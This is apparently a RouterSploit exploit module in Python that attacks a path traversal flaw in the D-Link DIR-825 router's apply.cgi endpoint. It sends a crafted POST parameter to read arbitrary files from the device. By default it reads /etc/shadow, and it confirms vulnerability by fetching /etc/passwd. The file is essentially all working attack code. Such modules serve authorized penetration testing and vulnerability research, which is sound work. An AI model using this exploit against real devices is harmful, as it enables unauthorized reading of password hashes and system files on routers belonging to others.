from routersploit import (
    exploits,
    print_success,
    print_error,
    print_status,
    print_info,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for D-Link DIR-825 path traversal vulnerability.
    If the target is vulnerable it allows to read files from the device."
    """
    __info__ = {
        'name': 'D-Link DIR-825 Path Traversal',
        'description': 'Module exploits D-Link DIR-825 path traversal vulnerability, which allows reading files from the device',
        'authors': [
            'Samuel Huntley',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/38718/',
        ],
        'devices': [
            'D-Link DIR-825',
        ]
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port
    filename = exploits.Option('/etc/shadow', 'File to read')  # file to read
    username = exploits.Option('admin', 'Username to log in with')  # username - default: admin
    password = exploits.Option('', 'Password to log in with')  # password - default: blank

    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")
            file_path = "..{}".format(self.filename)

            url = "{}:{}/apply.cgi".format(self.target, self.port)
            data = {"html_response_page": file_path,
                    "action": "do_graph_auth",
                    "login_name": "test",
                    "login_pass": "test1",
                    "&login_n": "test2",
                    "log_pass": "test3",
                    "graph_code": "63778",
                    "session_id": "test5",
                    "test": "test"}

            print_status("Sending request payload using credentials: {} / {}".format(self.username, self.password))
            response = http_request(method="POST", url=url, data=data, auth=(self.username, self.password))
            if response is None:
                return

            if response.status_code == 200:
                print_status("File: {}".format(self.filename))
                print_info(response.text)
            else:
                print_error("Exploit failed - could not read response")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        url = "{}:{}/apply.cgi".format(self.target, self.port)
        data = {"html_response_page": "/etc/passwd",
                "action": "do_graph_auth",
                "login_name": "test",
                "login_pass": "test1",
                "&login_n": "test2",
                "log_pass": "test3",
                "graph_code": "63778",
                "session_id": "test5",
                "test": "test"}

        response = http_request(method="POST", url=url, data=data, auth=(self.username, self.password))
        if response is None:
            return False  # target is not vulnerable

        if "root:" in response.text:
            return True  # target vulnerable

        return False  # target not vulnerable
